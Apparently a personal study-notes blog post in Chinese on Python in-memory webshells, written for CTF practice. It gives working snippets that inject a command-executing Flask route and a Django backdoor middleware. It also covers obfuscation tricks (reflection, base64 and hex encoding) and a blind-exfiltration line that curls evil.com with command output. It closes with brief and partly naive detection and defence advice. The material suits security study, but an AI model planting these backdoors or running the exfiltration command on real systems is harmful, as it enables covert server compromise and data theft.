---
title: python内存马
date: 2025-04-16 19:31:49
tags:
- python内存马
category:
- 学习笔记
---

# Python 内存马（内存 Webshell）技术详解

[pyramid  框架无回显挖掘 先知社区](https://xz.aliyun.com/news/16068?u_atoken=74c41920a00b8b254e2bcd921ea0fda6&u_asig=0a472f8317440258840025575e0034)

[强网杯 RS 加密签名伪造及 PyramidWeb 利用栈帧打内存马 先知社区](https://xz.aliyun.com/news/16464?time__1311=eqUxnDRD0QitIxWqGNcjDaAYD540INmhdx&u_atoken=a499ee16a29b0d3a2eedd30daf7c756c&u_asig=0a47309317440258746795862e00fe)

[对 pyramid 框架无回显的学习以一道 ctf 题目为例 先知社区](https://xz.aliyun.com/news/16090?u_atoken=87dba66839b39d2b13eae6e4583416ca&u_asig=0a47309317440258787906072e00fe)

https://www.cnblogs.com/gxngxngxn/p/18181936

内存马（In-Memory Webshell）是一种无文件攻击技术，特别适用于Python Web应用。以下是Python环境下内存马的全面分析：

## 一、Python内存马核心原理

Python内存马主要通过以下方式实现：
1. **运行时代码注入**：利用`exec`/`eval`等函数动态执行代码
2. **框架Hook**：修改Web框架的路由、视图或中间件
3. **全局拦截**：劫持Python内置函数或模块

## 二、常见Python内存马实现方式

### 1. 路由型内存马（最常用）

```python
# Flask示例
exec("""
from flask import request
@app.route('/_shell')
def shell():
    import os
    return os.popen(request.args.get('cmd')).read()
""")

# 访问方式：/_shell?cmd=whoami
```

### 2. 中间件型内存马

```python
# Django示例
exec("""
from django.http import HttpResponse
class MalwareMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
    
    def __call__(self, request):
        if request.path == '/_backdoor':
            import os, subprocess
            cmd = request.GET.get('c', 'whoami')
            return HttpResponse(subprocess.getoutput(cmd))
        return self.get_response(request)
    
# 注入中间件
import django.conf
django.conf.settings.MIDDLEWARE.insert(0, 'path.to.MalwareMiddleware')
""")
```

### 3. 异常处理型内存马

```python
exec("""
import sys
def exploit(type, value, tb):
    if hasattr(value, 'cmd'):
        import os
        return os.popen(value.cmd).read()
sys.excepthook = exploit

# 触发方式：raise type('', (), {'cmd': 'whoami'})
""")
```

## 三、高级隐蔽技术

### 1. 反射加载

```python
# 通过字符串反射调用
getattr(__import__('os'), 'system')('whoami')
```

### 2. 编码混淆

```python
# Base64编码执行
import base64
exec(base64.b64decode('cHJpbnQoIkhlbGxvIFdvcmxkISIp'))
```

### 3. 延迟加载

```python
# 使用__import__延迟加载
def malicious():
    return __import__('os').system('sleep 10')
```

## 四、检测与防御方案

### 检测方法：
1. **运行时检查**：
   ```python
   import inspect
   # 检查所有路由
   print(app.url_map)
   # 检查已加载模块
   print(sys.modules)
   ```

2. **内存扫描工具**：
   - Pyrasite
   - Memhunter

### 防御措施：
1. **禁用危险函数**：
   ```python
   __builtins__.exec = None
   __builtins__.eval = None
   ```

2. **沙箱环境**：
   ```python
   from restrictedpython import compile_restricted
   ```

3. **RASP防护**：
   - 监控异常路由注册
   - 拦截危险模块加载

## 五、CTF实战技巧

1. **绕过过滤**：
   ```python
   # 字符串拼接
   'ex'+'ec("import os; os.system(\'whoami\')")'
   
   # Unicode编码
   exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73')
   ```

2. **无回显利用**：
   ```python
   # DNS外带
   exec("import os; os.system('curl http://evil.com/`whoami`')")
   ```

3. **持久化**：
   ```python
   # 修改.pyc文件
   import py_compile
   py_compile.compile('malicious.py')
   ```

Python内存马因其灵活性成为高级攻击手段，理解其原理对攻防双方都至关重要。在CTF比赛中，这类题目通常考察代码审计、绕过技巧和内存操作能力。
